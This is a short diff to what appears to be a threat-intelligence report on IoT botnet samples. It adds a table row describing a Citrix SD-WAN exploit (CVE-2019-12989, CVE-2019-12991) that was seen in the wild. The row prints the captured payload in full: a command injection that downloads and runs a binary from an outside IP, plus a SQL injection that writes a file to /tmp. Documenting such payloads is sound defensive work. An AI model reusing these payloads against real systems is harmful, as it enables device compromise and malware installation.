@@ -33,6 +33,9 @@ akumaiotsolutions[.]pw:912
 ```
 
 ### Exploits
+
+New exploits in these samples seen for the first time in the wild
+
 |*Vulnerability* | *Affected Devices* | *Exploit Format*|
 |---|---|---|
 |[CVE-2019-12989, CVE-2019-12991](https://www.exploit-db.com/exploits/47112)|Citrix SD-WAN Appliances (tested on 10.2.2)|```POST /sdwan/nitro/v1/config/get_package_file?action=file_download/cgi-bin/installpatch.cgi?swc-token=%d&installfile=`%s`' % '99999 cd /tmp; wget http://185.164.72.155/richard; curl -O http://185.164.72.155/richard; chmod +x richard; ./richard HTTP/1.1```<br>```'SSL_CLIENT_VERIFY' : 'SUCCESS'```<br>```get_package_fil:```<br>```site_name: 'blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_0';#,appliance_type: primary,package_type: active```<br><br>```User-Agent: Hello-World```<br>```Connection: keep-alive```|
